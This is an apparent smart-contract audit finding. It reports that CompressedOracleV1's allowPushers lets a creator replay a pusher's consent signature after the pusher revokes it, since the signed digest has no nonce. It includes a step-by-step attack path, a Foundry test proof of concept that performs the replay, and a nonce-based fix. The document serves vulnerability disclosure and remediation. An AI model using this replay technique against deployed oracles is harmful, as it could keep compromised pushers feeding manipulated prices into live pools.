### Title
Pusher Revocation Is Bypassable via Signature Replay in `allowPushers` — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` uses a deadline as the sole replay-prevention mechanism for pusher consent signatures. Because the signed message contains no nonce or revocation counter, a creator who holds a valid (non-expired) signature can call `allowPushers` again immediately after a pusher calls `revokePusher()`, silently re-establishing the delegation. The pusher's self-revocation is therefore ineffective until the deadline expires. If the pusher's key is compromised in the interim, the attacker retains write authority over the creator's namespace and can continue pushing bad prices into pools.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no revocation counter, and no per-delegation identifier in the signed payload. The only expiry mechanism is the `deadline` field. The code's own comment acknowledges the partial problem:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [2](#0-1) 

The comment treats the deadline as the fix, but the deadline only prevents re-establishment **after** it expires. While the deadline is still valid, the creator can replay the identical signature an unlimited number of times. `revokePusher()` clears `namespaceRemapping[msg.sender]`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But the creator can immediately call `allowPushers` with the same `(deadline, pusher, sig)` tuple to write `namespaceRemapping[pusher] = creator` again, because the signature is still cryptographically valid and the deadline has not passed.

The `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So any push from the compromised pusher key continues to land in the creator's namespace as long as the delegation is re-established.

---

### Impact Explanation

The `CompressedOracleV1` is the open oracle consumed by `AnchoredPriceProvider` (and similar providers) which feed bid/ask prices directly into `MetricOmmPool.swap`. Bad prices pushed into the creator's namespace propagate to live pool swaps without any in-swap attribution guard (the compressed oracle's `price()` is permissionless).

Attack path:

1. Creator C establishes a delegation: `allowPushers(deadline=now+1year, [P], [sig])` → `namespaceRemapping[P] = C`.
2. Pusher P's private key is compromised; attacker begins pushing manipulated prices into C's namespace.
3. Pusher P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. Creator C (unaware the key is compromised, or acting maliciously) calls `allowPushers` with the **same** `(deadline, [P], [sig])` → `namespaceRemapping[P] = C` is restored.
5. Attacker continues pushing bad prices into C's namespace.
6. Any pool whose `AnchoredPriceProvider` reads `feedIdOf(C, slotIndex, positionIndex)` receives the manipulated mid price, spread, and timestamp, producing an incorrect bid/ask that settles live swaps at a bad price.

The invariant broken: **a pusher's self-revocation must be final and unblockable by the creator**. The missing nonce means the creator's hold on a valid signature is equivalent to a permanent veto over the pusher's revocation right, for the entire lifetime of the deadline.

---

### Likelihood Explanation

The creator is a permissionless role — anyone can be a creator. A creator who set up a long-lived delegation (e.g., 1 year) and does not monitor the pusher's on-chain revocation event will naturally replay the signature to "restore" what looks like an accidental revocation. This is a realistic, non-adversarial path to the vulnerability. A malicious creator can exploit it deliberately. Either way, the pusher has no on-chain recourse until the deadline expires.

---

### Recommendation

Include a per-pusher revocation nonce in the signed digest. Maintain a `mapping(address => uint256) public pusherNonce` that is incremented on every successful `revokePusher()` or `removePushers()` call. The consent signature must commit to the current nonce:

```solidity
keccak256(abi.encode(
    block.chainid,
    address(this),
    deadline,
    pusher,
    msg.sender,
    pusherNonce[pusher]   // ← new field
))
```

After revocation, `pusherNonce[pusher]++` invalidates all previously issued signatures for that pusher, regardless of their deadline.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayRevokeTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE;
    uint256 constant PUSHER_KEY  = 0xBEEF;
    address creator;
    address pusher;

    function setUp() public {
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeBypassedBySignatureReplay() public {
        uint256 deadline = block.timestamp + 365 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds — no revert
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "FAIL: revocation bypassed; pusher is re-delegated without new consent");
    }
}
```

Running `forge test --mt testRevokeBypassedBySignatureReplay` passes (the final assertion holds), confirming that the creator can silently re-establish a delegation the pusher explicitly revoked, using only the original signature. [5](#0-4) [3](#0-2) [6](#0-5)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```
